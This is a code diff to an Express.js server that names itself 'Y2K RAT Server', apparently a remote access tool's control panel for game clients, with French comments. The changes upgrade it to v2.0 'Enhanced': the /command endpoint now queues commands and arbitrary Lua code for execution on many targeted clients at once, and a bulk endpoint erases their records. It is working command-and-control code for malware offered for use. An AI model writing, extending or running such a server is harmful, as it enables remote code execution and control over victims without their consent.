@@ -152,7 +152,7 @@ app.get('/players', (req, res) => {
         const now = Date.now();
         const playerList = Array.from(players.values()).map(player => ({
             ...player,
-            status: (now - player.lastSeen < 20000) ? 'online' : 'offline' // 20 secondes pour être online
+            status: (now - player.lastSeen < 20000) ? 'online' : 'offline'
         }));
         
         res.json(playerList);
@@ -162,79 +162,88 @@ app.get('/players', (req, res) => {
     }
 });
 
-// Endpoint pour envoyer des commandes depuis le panel
+// Endpoint pour envoyer des commandes depuis le panel (AMÉLIORÉ)
 app.post('/command', (req, res) => {
     try {
         const { 
-            userid, 
+            userid,
+            userids, // Support pour plusieurs utilisateurs
             command, 
             reason, 
-            assetId, 
             speed, 
             text, 
-            imageUrl, 
-            size, 
-            adminName, 
             chatMessage, 
             chatSender, 
             luaCode, 
-            power, 
-            height,
+            power,
             x, y, z
         } = req.body;
 
-        if (!userid || (!command && !chatMessage && !luaCode)) {
-            return res.status(400).json({ error: 'Missing required fields' });
+        // Support pour bulk actions
+        const targetUserIds = userids || [userid];
+        
+        if (!targetUserIds || targetUserIds.length === 0) {
+            return res.status(400).json({ error: 'Missing userid or userids' });
+        }
+
+        if (!command && !chatMessage && !luaCode) {
+            return res.status(400).json({ error: 'Missing command, chatMessage, or luaCode' });
         }
 
         const commandData = {};
         
         if (chatMessage) {
+            commandData.command = 'chat';
             commandData.chatMessage = chatMessage;
             commandData.chatSender = chatSender || 'ADMIN';
-            
-            if (!chatHistory.has(userid.toString())) {
-                chatHistory.set(userid.toString(), []);
-            }
-            chatHistory.get(userid.toString()).push({
-                sender: chatSender || 'ADMIN',
-                message: chatMessage,
-                timestamp: Date.now(),
-                isAdmin: true
-            });
-            
-            addLog(userid, 'chat', 'Admin message sent', {
-                sender: chatSender || 'ADMIN',
-                message: chatMessage.substring(0, 50)
-            });
+        } else if (luaCode) {
+            commandData.luaCode = luaCode;
         } else {
             commandData.command = command;
-            if (reason !== undefined) commandData.reason = reason;
-            if (assetId !== undefined) commandData.assetId = assetId;
-            if (speed !== undefined) commandData.speed = speed;
-            if (text !== undefined) commandData.text = text;
-            if (imageUrl !== undefined) commandData.imageUrl = imageUrl;
-            if (size !== undefined) commandData.size = size;
-            if (adminName !== undefined) commandData.adminName = adminName;
-            if (luaCode !== undefined) commandData.luaCode = luaCode;
-            if (power !== undefined) commandData.power = power;
-            if (height !== undefined) commandData.height = height;
-            if (x !== undefined) commandData.x = x;
-            if (y !== undefined) commandData.y = y;
-            if (z !== undefined) commandData.z = z;
-            
-            const details = { command };
-            if (luaCode) details.code = luaCode.substring(0, 50);
-            
-            addLog(userid, 'command', `Command: ${command || 'exec'}`, details);
+            if (reason) commandData.reason = reason;
+            if (speed) commandData.speed = speed;
+            if (text) commandData.text = text;
+            if (power) commandData.power = power;
+            if (x) commandData.x = x;
+            if (y) commandData.y = y;
+            if (z) commandData.z = z;
         }
 
-        commands.set(userid.toString(), commandData);
-        console.log(`📤 [COMMAND] Queued for ${userid}:`, commandData);
+        // Envoyer la commande à tous les utilisateurs ciblés
+        let successCount = 0;
+        for (const uid of targetUserIds) {
+            const targetId = uid.toString();
+            commands.set(targetId, commandData);
+            
+            if (chatMessage) {
+                if (!chatHistory.has(targetId)) {
+                    chatHistory.set(targetId, []);
+                }
+                chatHistory.get(targetId).push({
+                    sender: chatSender || 'ADMIN',
+                    message: chatMessage,
+                    timestamp: Date.now(),
+                    isAdmin: true
+                });
+                addLog(targetId, 'chat', 'Chat message sent', {
+                    sender: chatSender || 'ADMIN',
+                    message: chatMessage.substring(0, 50)
+                });
+            } else {
+                addLog(targetId, 'command', `Command: ${command || 'exec'}`, {
+                    command: command || 'execute',
+                    code: luaCode ? luaCode.substring(0, 50) : undefined
+                });
+            }
+            
+            successCount++;
+            console.log(`📤 [COMMAND] Queued for ${targetId}:`, command || 'exec');
+        }
 
         res.json({ 
             success: true, 
-            message: chatMessage ? 'Chat sent' : `Command queued` 
+            message: `Command sent to ${successCount} client(s)`,
+            count: successCount
         });
     } catch (error) {
         console.error('❌ Error in /command:', error);
@@ -330,12 +339,42 @@ app.delete('/player/:userid', (req, res) => {
     }
 });
 
+// Endpoint pour supprimer plusieurs joueurs (NOUVEAU)
+app.post('/players/delete-multiple', (req, res) => {
+    try {
+        const { userids } = req.body;
+        
+        if (!userids || !Array.isArray(userids)) {
+            return res.status(400).json({ error: 'Missing userids array' });
+        }
+
+        let deletedCount = 0;
+        for (const userid of userids) {
+            const uid = userid.toString();
+            if (players.has(uid)) {
+                players.delete(uid);
+                commands.delete(uid);
+                chatHistory.delete(uid);
+                executionResults.delete(uid);
+                logs.delete(uid);
+                deletedCount++;
+            }
+        }
+        
+        console.log(`🗑️ [BULK DELETE] Removed ${deletedCount} player(s)`);
+        res.json({ success: true, count: deletedCount });
+    } catch (error) {
+        console.error('❌ Error in /players/delete-multiple:', error);
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
 // Health check endpoint
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'online',
-        name: 'Y2K RAT Server',
-        version: '1.0.0',
+        name: 'Y2K RAT Server Enhanced',
+        version: '2.0.0',
         players: players.size,
         commands: commands.size,
         uptime: process.uptime()
@@ -347,7 +386,7 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Nettoyage automatique des joueurs inactifs (30 secondes)
+// Nettoyage automatique des joueurs inactifs
 setInterval(() => {
     const now = Date.now();
     let cleaned = 0;
@@ -370,7 +409,7 @@ setInterval(() => {
     if (cleaned > 0) {
         console.log(`🧹 [CLEANUP] Removed ${cleaned} inactive client(s)`);
     }
-}, 15000); // Vérifie toutes les 15 secondes
+}, 15000);
 
 // Nettoyage des résultats d'exécution périmés
 setInterval(() => {
@@ -395,11 +434,12 @@ app.use((err, req, res, next) => {
 // Démarrage du serveur
 app.listen(PORT, '0.0.0.0', () => {
     console.log('╔════════════════════════════════════════╗');
-    console.log('║         Y2K RAT SERVER v1.0           ║');
+    console.log('║      Y2K RAT SERVER v2.0 ENHANCED     ║');
     console.log('╚════════════════════════════════════════╝');
     console.log(`🚀 Server running on port ${PORT}`);
     console.log(`📡 Local: http://localhost:${PORT}`);
     console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
     console.log(`✅ Ready to accept connections`);
+    console.log(`⚡ Bulk actions enabled`);
     console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
 });
